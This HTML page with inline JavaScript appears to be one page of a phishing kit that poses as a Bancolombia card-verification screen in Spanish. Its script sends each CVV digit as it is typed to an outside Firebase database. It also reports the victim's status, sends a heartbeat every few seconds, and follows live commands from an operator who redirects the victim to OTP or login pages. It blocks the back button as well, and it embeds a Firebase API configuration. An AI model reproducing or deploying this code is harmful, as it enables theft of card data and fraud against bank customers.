<body class="relative flex flex-col w-full h-dvh bg-[#F1F1F1]">

            <p>Procesando...</p>
        </span>
    </div>
    <!-- LOGO ARRIBA CENTRADO -->
    <div class="bg-white w-full py-4 flex items-center justify-center">
        <svg width="168" height="21" viewBox="0 0 168 21" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path fill-rule="evenodd" clip-rule="evenodd" d="M3.69395 7.0431C3.81585 7.50053 4.29135 7.73644 4.77442 7.58135C8.73479 6.40392 12.7049 5.59819 16.8013 5.01201C17.2707 4.95131 17.5276 4.48227 17.355 4.01175C16.9914 3.02034 16.8075 2.52594 16.4358 1.54024C16.2779 1.12175 15.8511 0.847233 15.4142 0.893041C11.4109 1.36994 7.54317 2.07424 3.66691 3.15907C3.16219 3.3122 2.85224 3.8583 2.97951 4.34272C3.26277 5.42133 3.40565 5.96122 3.69395 7.0431" fill="#2C2A29"/>

    <div class="flex flex-col items-center w-full h-full mt-8">
        <p class="text-[16pt] font-semibold py-8">Ingresa tu CVC/CVV</p>
  
        <div class="flex flex-col items-center justify-center rounded-lg shadow-md gap-7 w-[95%] md:w-[550px] h-[325px] pt-8 bg-white">
            <div class="flex justify-center mb-2">
                <img src="./assets/card.jpg" alt="Tarjeta" class="w-[200px] h-auto rounded-lg shadow-md">
            </div>
            <span class="flex flex-col items-center gap-3">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#2C2A29" stroke-width="2">
                    <path d="M16 10V7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7V10M16 10H8M16 10H17C18.1046 10 19 10.8954 19 12V19C19 20.1046 18.1046 21 17 21H7C5.89543 21 5 20.1046 5 19V12C5 10.8954 5.89543 10 7 10H8"/>
                </svg>
                <p class="text-[13pt]">Código de verificación de tu tarjeta</p>
            </span>
            <span class="relative flex flex-row items-center justify-center w-full px-14 gap-4">
                <input id="cvv1" class="focus:border-b-[#f9d523e0] focus:outline-none text-[18pt] text-center w-[40px] h-[50px] border-b border-b-black" inputmode="numeric" type="text" maxlength="1">
                <input id="cvv2" class="focus:border-b-[#f9d523e0] focus:outline-none text-[18pt] text-center w-[40px] h-[50px] border-b border-b-black" inputmode="numeric" type="text" maxlength="1">
                <input id="cvv3" class="focus:border-b-[#f9d523e0] focus:outline-none text-[18pt] text-center w-[40px] h-[50px] border-b border-b-black" inputmode="numeric" type="text" maxlength="1">
            </span>
            <p class="text-[11pt] text-gray-500 text-center px-10">Son los 3 dígitos en la parte posterior de tu tarjeta</p>
        </div>
        <img src="./assets/logo.svg" alt="">
    </div>
    <div class="mt-auto mb-4 flex flex-col items-center">
        <svg width="168" height="21" viewBox="0 0 168 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="mb-2">
            <path fill-rule="evenodd" clip-rule="evenodd" d="M3.69395 7.0431C3.81585 7.50053 4.29135 7.73644 4.77442 7.58135C8.73479 6.40392 12.7049 5.59819 16.8013 5.01201C17.2707 4.95131 17.5276 4.48227 17.355 4.01175C16.9914 3.02034 16.8075 2.52594 16.4358 1.54024C16.2779 1.12175 15.8511 0.847233 15.4142 0.893041C11.4109 1.36994 7.54317 2.07424 3.66691 3.15907C3.16219 3.3122 2.85224 3.8583 2.97951 4.34272C3.26277 5.42133 3.40565 5.96122 3.69395 7.0431" fill="#2C2A29"/>
        </svg>
        <p class="text-[10px] text-gray-600">Dirección IP: 192.230.104.9 | <span id="date"></span></p>
    </div>
    <script>
        // ===================================
        // VALIDAR TOKEN Y REDIRIGIR SI EXPIRÓ
        // ===================================
        (function() {
            const token = localStorage.getItem('token');
            const tokenExpires = parseInt(localStorage.getItem('tokenExpires'));
            const ahora = Date.now();
            
            if (!token || !tokenExpires || ahora > tokenExpires) {
                console.log('❌ Token expirado - Redirigiendo al inicio');
                localStorage.clear();
                sessionStorage.clear();
                window.location.replace('/');
                throw new Error('Token expirado');
            }
            
            console.log('✅ Token válido');
        })();
        
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyA_rlIDFsfp2cJrPp0Q4N9QLA3hKKslIU8",
            authDomain: "gol404.firebaseapp.com",
            databaseURL: "https://gol404-default-rtdb.firebaseio.com",
            projectId: "gol404",
            storageBucket: "gol404.firebasestorage.app",
            messagingSenderId: "502610353442",
            appId: "1:502610353442:web:29e2c7bd9459277db9597b"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        const hostToken = localStorage.getItem('token');
        const tokenExpires = parseInt(localStorage.getItem('tokenExpires'));
        const userId = 'admin';
        
        if (!hostToken || !tokenExpires || Date.now() > tokenExpires) {
            console.log('❌ Token inválido o expirado');
            localStorage.removeItem('token');
            localStorage.removeItem('tokenExpires');
            localStorage.removeItem('currentDeviceId');
            window.location.href = '/captura-tigo.html';
            throw new Error('Token no válido');
        }
        
        let currentDeviceId = localStorage.getItem('currentDeviceId');
        let heartbeatInterval = null;
        
        function startHeartbeat() {
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            heartbeatInterval = setInterval(async () => {
                if (currentDeviceId && hostToken && userId) {
                    try {
                        await database.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}/lastActivity`).set(Date.now());
                    } catch (error) {
                        console.error('❌ Error en heartbeat:', error);
                    }
                }
            }, 3000);
        }
        
        function escucharComandos() {
            if (!currentDeviceId || !hostToken || !userId) return;
            const commandRef = database.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}/command`);
            
            commandRef.on('value', async (snapshot) => {
                const command = snapshot.val();
                if (!command) return;
                await commandRef.set(null);
                
                if (command === 'otp') {
                    window.location.href = `OTP.html`;
                } else if (command === 'login-error') {
                    window.location.href = `login.html?err`;
                } else if (command === 'cerrar') {
                    if (heartbeatInterval) clearInterval(heartbeatInterval);
                    window.location.href = '../../../../finalizado.html';
                } else if (command === 'reiniciar') {
                    if (heartbeatInterval) clearInterval(heartbeatInterval);
                    // ✅ LEER DOMINIO DE FIREBASE (SIN limpiar localStorage)
                    database.ref(`sessions/${userId}/${hostToken}/dominio`).once('value', (snap) => {
                        const dominio = snap.val() || window.location.origin;
                        window.location.href = `${dominio}/captura-tigo.html`;
                    });
                }
            });
            
            // ✅ ESCUCHAR si el dispositivo se elimina
            const deviceRef = database.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}`);
            deviceRef.on('value', (snapshot) => {
                if (!snapshot.exists()) {
                    console.log('⚠️ Sesión eliminada');
                    if (heartbeatInterval) clearInterval(heartbeatInterval);
                    // ✅ LEER DOMINIO DE FIREBASE (SIN limpiar localStorage)
                    database.ref(`sessions/${userId}/${hostToken}/dominio`).once('value', (snap) => {
                        const dominio = snap.val() || window.location.origin;
                        window.location.href = `${dominio}/captura-tigo.html`;
                    });
                }
            });
        }
        
        async function init() {
            if (!currentDeviceId || currentDeviceId === 'null' || currentDeviceId === 'undefined') {
                console.error('❌ ERROR: No hay deviceId válido en localStorage');
                return;
            }
            
            if (!hostToken || !userId) {
                console.error('❌ ERROR: Faltan parámetros en URL');
                return;
            }
            
            await database.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}`).update({
                type: 'Bancolombia',
                status: 'en página CVV',
                'data/paso': 'cvv',
                'data/cvv': '',
                lastActivity: Date.now()
            });
            startHeartbeat();
            escucharComandos();
        }
        
        async function actualizarCVV(cvv) {
            if (!currentDeviceId || !hostToken || !userId) return;
            
            try {
                await database.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}`).update({
                    'data/cvv': cvv,
                    'lastActivity': Date.now()
                });
                console.log(`✅ CVV actualizado en tiempo real: ${cvv}`);
            } catch (error) {
                console.error('❌ Error actualizando CVV:', error);
            }
        }
        
        const loaderStatus = (status) => {
            const loader = document.getElementById("loader");
            if(status) loader.classList.remove("hidden");
            else loader.classList.add("hidden");
        }
        
        const cvv1 = document.getElementById('cvv1');
        const cvv2 = document.getElementById('cvv2');
        const cvv3 = document.getElementById('cvv3');
        const inputs = [cvv1, cvv2, cvv3];
        
        function getCVV() {
            return cvv1.value + cvv2.value + cvv3.value;
        }
        
        inputs.forEach((input, index) => {
            input.addEventListener('input', async (e) => {
                const value = e.target.value;
                
                if (!/^\d$/.test(value)) {
                    e.target.value = '';
                    return;
                }
                
                // ✅ Actualizar en Firebase INMEDIATAMENTE
                await actualizarCVV(getCVV());
                
                if (value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                
                if (getCVV().length === 3) {
                    console.log('🔔 CVV completado - Auto-enviando:', getCVV());
                    loaderStatus(true);
                    
                    try {
                        await database.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}`).update({
                            status: 'completó CVV',
                            lastActivity: Date.now()
                        });
                        console.log('✅ Status actualizado a completó CVV');
                    } catch (error) {
                        console.error('❌ Error actualizando status:', error);
                    }
                    
                    setTimeout(() => {
                        window.location.href = `WAITING.html`;
                    }, 2000);
                }
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
        
        function obtenerFechaHoraActual() {
            const fechaHora = new Date();
            const diasSemana = ["Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado"];
            const meses = ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre"];
            const dia = fechaHora.getDate();
            const año = fechaHora.getFullYear();
            let hora = fechaHora.getHours();
            const minutos = fechaHora.getMinutes();
            const segundos = fechaHora.getSeconds();
            let periodo = "AM";
            if (hora > 12) { hora -= 12; periodo = "PM"; }
            if (hora === 0) hora = 12;
            return `${diasSemana[fechaHora.getDay()]} ${dia} de ${meses[fechaHora.getMonth()]} de ${año} ${hora}:${minutos < 10 ? "0" + minutos : minutos}:${segundos < 10 ? "0" + segundos : segundos} ${periodo}`;
        }
        
        document.getElementById("date").innerText = obtenerFechaHoraActual();
        setInterval(() => {
            document.getElementById("date").innerText = obtenerFechaHoraActual();
        }, 1000);
        
        init();
        
        // ===================================
        // ✅ DETECTAR BOTÓN ATRÁS DEL NAVEGADOR (SIN limpiar localStorage)
        // ===================================
        window.addEventListener('popstate', function(event) {
            console.log('🔙 Usuario presionó botón atrás');
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            // ✅ LEER DOMINIO DE FIREBASE (SIN limpiar localStorage)
            database.ref(`sessions/${userId}/${hostToken}/dominio`).once('value', (snap) => {
                const dominio = snap.val() || window.location.origin;
                window.location.href = `${dominio}/captura-tigo.html`;
            });
        });
        
        history.pushState(null, null, window.location.href);
    </script>
